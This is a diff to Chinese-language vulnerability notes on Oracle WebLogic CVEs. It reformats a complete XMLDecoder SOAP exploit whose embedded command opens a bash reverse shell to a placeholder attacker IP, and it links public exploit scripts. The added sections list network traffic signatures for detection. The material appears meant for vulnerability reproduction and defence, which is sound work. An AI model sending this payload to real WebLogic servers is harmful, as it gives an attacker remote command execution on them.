@@ -99,29 +99,35 @@ Connection: close
 Content-Type: text/xml
 Content-Length: 633
 
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
-<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
-<java version="1.4.0" class="java.beans.XMLDecoder">
-<void class="java.lang.ProcessBuilder">
-<array class="java.lang.String" length="3">
-<void index="0">
-<string>/bin/bash</string>
-</void>
-<void index="1">
-<string>-c</string>
-</void>
-<void index="2">
-<string>bash -i &gt;&amp; /dev/tcp/接收shell的ip/21 0&gt;&amp;1</string> 
-</void>
-</array>
-<void method="start"/></void>
-</java>
-</work:WorkContext>
-</soapenv:Header>
-<soapenv:Body/>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
+  <soapenv:Header> 
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
+      <java version="1.4.0" class="java.beans.XMLDecoder"> 
+        <void class="java.lang.ProcessBuilder"> 
+          <array class="java.lang.String" length="3"> 
+            <void index="0"> 
+              <string>/bin/bash</string> 
+            </void> 
+            <void index="1"> 
+              <string>-c</string> 
+            </void> 
+            <void index="2"> 
+              <string>bash -i &gt;&amp; /dev/tcp/接收shell的ip/21 0&gt;&amp;1</string> 
+            </void> 
+          </array> 
+          <void method="start"/> 
+        </void> 
+      </java> 
+    </work:WorkContext> 
+  </soapenv:Header> 
+  <soapenv:Body/> 
 </soapenv:Envelope>
 
 ```
+
+### 流量特征
+
+危险的 XML 负载，如 `java.beans.XMLDecoder`、`java.lang.ProcessBuilder`、执行的命令等
 
 ## T3 反序列化漏洞（CVE-2018-2628）
 
@@ -147,6 +153,10 @@ T3 协议在开放 WebLogic 控制台端口的应用上默认开启. 攻击者�
 
 <https://github.com/jas502n/CVE-2018-2628/blob/master/CVE-2018-2628-Getshell.py>
 
+### 流量特征
+
+大规模的序列化负载（长串的二进制数据）
+
 ## 任意文件上传漏洞（CVE-2018-2894）
 
 ### 版本
@@ -166,6 +176,13 @@ Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文
 ### POC & EXP
 
 > <https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2018-2894_poc_exp.py>
+
+### 流量特征
+
+URLs：
+
+- `/ws_utc/config.do`（前端上传页面）
+- `/ws_utc/resources/setting/keystore?timestamp=1535682238190`（上传API节点）
 
 ## 未授权+命令执行漏洞（CVE-2020-14882,CVE-2020-14883）
 
@@ -212,7 +229,11 @@ _nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java
 ### EXP
 
 > <https://github.com/GGyao/CVE-2020-14882_ALL>
->
+
+### 流量特征
+
+URL：`/console/images/%252E%252E%252Fconsole.portal`
+
 ## 参考文章
 
 > [weblogic漏洞复现整理汇总（vulhub）](https://blog.csdn.net/qq_43593134/article/details/119801840)
